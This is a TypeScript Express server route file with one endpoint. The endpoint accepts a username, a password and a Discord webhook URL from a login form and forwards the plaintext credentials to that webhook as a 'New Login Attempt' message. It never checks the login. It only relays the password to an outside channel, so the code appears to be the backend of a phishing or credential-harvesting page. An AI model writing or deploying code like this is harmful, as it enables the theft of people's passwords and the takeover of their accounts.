import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { loginFormSchema } from "@shared/schema";
import { ZodError } from "zod";
import { fromZodError } from "zod-validation-error";
import axios from "axios";

export async function registerRoutes(app: Express): Promise<Server> {
  // API endpoint to send webhook message to Discord
  app.post("/api/webhook", async (req, res) => {
    try {
      // Validate input
      const formData = loginFormSchema.parse(req.body);
      const { username, password, webhookUrl } = formData;

      // Prepare Discord webhook message
      const message = {
        content: "New Login Attempt",
        embeds: [{
          title: "Login Information",
          color: 3447003, // Blue color
          fields: [
            {
              name: "Username",
              value: username,
              inline: true
            },
            {
              name: "Password",
              value: password,
              inline: true
            },
            {
              name: "Timestamp",
              value: new Date().toISOString(),
              inline: false
            }
          ]
        }]
      };

      // Send to Discord webhook
      try {
        await axios.post(webhookUrl, message, {
          headers: {
            'Content-Type': 'application/json',
          }
        });
        
        return res.status(200).json({ success: true, message: "Login information sent successfully!" });
      } catch (error) {
        console.error("Discord webhook error:", error);
        return res.status(500).json({ 
          success: false, 
          message: "Failed to send information. Please check the webhook URL."
        });
      }
    } catch (error) {
      if (error instanceof ZodError) {
        const validationError = fromZodError(error);
        return res.status(400).json({ 
          success: false, 
          message: validationError.message 
        });
      }
      
      console.error("Server error:", error);
      return res.status(500).json({ 
        success: false, 
        message: "An unexpected error occurred. Please try again."
      });
    }
  });

  const httpServer = createServer(app);
  return httpServer;
}
